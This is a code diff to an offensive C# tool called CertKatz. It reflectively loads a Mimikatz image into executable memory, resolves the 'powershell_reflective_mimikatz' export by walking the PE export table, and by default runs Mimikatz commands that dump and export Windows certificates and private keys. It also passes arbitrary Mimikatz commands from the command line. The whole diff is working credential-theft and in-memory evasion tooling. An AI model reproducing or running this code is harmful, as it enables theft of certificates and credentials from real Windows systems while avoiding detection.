@@ -21,6 +21,55 @@ namespace CertKatz
             return principal.IsInRole(WindowsBuiltInRole.Administrator);
         }
 
+        public static IntPtr codebase = IntPtr.Zero;
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate bool main(IntPtr arg1, uint arg2, IntPtr lparam);
+
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        public delegate IntPtr m(IntPtr command);
+
+        private static unsafe IntPtr GetFuncExport(PELoader pe, string funcName)
+        {
+            IntPtr ExportTablePtr = IntPtr.Zero;
+            PELoader.IMAGE_EXPORT_DIRECTORY expDir;
+
+            if (pe.Is32BitHeader && pe.OptionalHeader32.ExportTable.Size == 0)
+                return IntPtr.Zero;
+            else if (!pe.Is32BitHeader && pe.OptionalHeader64.ExportTable.Size == 0)
+                return IntPtr.Zero;
+
+            if (pe.Is32BitHeader)
+                ExportTablePtr = (IntPtr)((ulong)codebase + (ulong)pe.OptionalHeader32.ExportTable.VirtualAddress);
+            else
+                ExportTablePtr = (IntPtr)((ulong)codebase + (ulong)pe.OptionalHeader64.ExportTable.VirtualAddress);
+
+            expDir = (PELoader.IMAGE_EXPORT_DIRECTORY)Marshal.PtrToStructure(ExportTablePtr, typeof(PELoader.IMAGE_EXPORT_DIRECTORY));
+
+            for (int i = 0; i < expDir.NumberOfNames; i++)
+            {
+                IntPtr NameOffsetPtr = (IntPtr)((ulong)codebase + (ulong)expDir.AddressOfNames);
+                NameOffsetPtr = (IntPtr)((ulong)NameOffsetPtr + (ulong)(i * Marshal.SizeOf(typeof(uint))));
+                IntPtr NamePtr = (IntPtr)((ulong)codebase + (uint)Marshal.PtrToStructure(NameOffsetPtr, typeof(uint)));
+
+                string Name = Marshal.PtrToStringAnsi(NamePtr);
+
+                if (Name.Contains(funcName))
+                {
+                    IntPtr AddressOfFunctions = (IntPtr)((ulong)codebase + (ulong)expDir.AddressOfFunctions);
+                    IntPtr OrdinalRvaPtr = (IntPtr)((ulong)codebase + (ulong)(expDir.AddressOfOrdinals + (i * Marshal.SizeOf(typeof(UInt16)))));
+                    UInt16 FuncIndex = (UInt16)Marshal.PtrToStructure(OrdinalRvaPtr, typeof(UInt16));
+                    IntPtr FuncOffsetLocation = (IntPtr)((ulong)AddressOfFunctions + (ulong)(FuncIndex * Marshal.SizeOf(typeof(UInt32))));
+                    IntPtr FuncLocationInMemory = (IntPtr)((ulong)codebase + (uint)Marshal.PtrToStructure(FuncOffsetLocation, typeof(UInt32)));
+
+                    return FuncLocationInMemory;
+                }
+            }
+
+            return IntPtr.Zero;
+        }
+
         static void Main(string[] args)
         {
             if (!IsHighIntegrity())
@@ -44,7 +93,7 @@ namespace CertKatz
                 // start of @subtee's PE loader
 
                 PELoader pe = new PELoader(unpacked);
-                IntPtr codebase = IntPtr.Zero;
+                
                 codebase = NativeDeclarations.VirtualAlloc(IntPtr.Zero, pe.OptionalHeader64.SizeOfImage, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
 
         //        // copy Sections
@@ -149,12 +198,37 @@ namespace CertKatz
                 // Transfer Control To OEP
                 Console.WriteLine("\n[*] Executing loaded Mimikatz PE");
 
-                //string fakeArgs = "crypto::certificates";
-                //IntPtr input = Marshal.StringToHGlobalUni(fakeArgs);
-                // args = fakeArgs;
                 IntPtr threadStart = (IntPtr)((long)(codebase.ToInt64() + (int)pe.OptionalHeader64.AddressOfEntryPoint));
-                IntPtr hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
-                NativeDeclarations.WaitForSingleObject(hThread, 30000);
+                main dllmain = (main) Marshal.GetDelegateForFunctionPointer(threadStart, typeof(main));
+                dllmain(codebase, 1, IntPtr.Zero);
+
+                IntPtr output;
+                IntPtr powerkatzPtr = GetFuncExport(pe, "powershell_reflective_mimikatz");
+                
+                m mimikatz = (m) Marshal.GetDelegateForFunctionPointer(powerkatzPtr, typeof(m));
+
+                IntPtr input;
+                if (args.Length == 0)
+                {
+                    input = Marshal.StringToHGlobalUni("crypto::capi \"crypto::certificates /export\"");
+                }
+                else
+                {
+                    string inputCmd = "";
+                    for (int i = 0; i < args.Length; i++)
+                    {
+                        inputCmd += $"{args[i]} ";
+                    }
+                    input = Marshal.StringToHGlobalUni(inputCmd);
+                   
+                }
+
+                output = mimikatz(input);
+                string results = Marshal.PtrToStringUni(output);
+                Console.Write(results);
+
+
+
             }
         }
     }
@@ -348,6 +422,33 @@ namespace CertKatz
             {
                 get { return new string(Name); }
             }
+        }
+
+        [StructLayout(LayoutKind.Explicit)]
+        public unsafe struct IMAGE_EXPORT_DIRECTORY
+        {
+            [FieldOffset(0)]
+            public UInt32 Characteristics;
+            [FieldOffset(4)]
+            public UInt32 TimeDateStamp;
+            [FieldOffset(8)]
+            public UInt16 MajorVersion;
+            [FieldOffset(10)]
+            public UInt16 MinorVersion;
+            [FieldOffset(12)]
+            public UInt32 Name;
+            [FieldOffset(16)]
+            public UInt32 Base;
+            [FieldOffset(20)]
+            public UInt32 NumberOfFunctions;
+            [FieldOffset(24)]
+            public UInt32 NumberOfNames;
+            [FieldOffset(28)]
+            public UInt32 AddressOfFunctions;
+            [FieldOffset(32)]
+            public UInt32 AddressOfNames;
+            [FieldOffset(36)]
+            public UInt32 AddressOfOrdinals;
         }
 
         [StructLayout(LayoutKind.Sequential)]
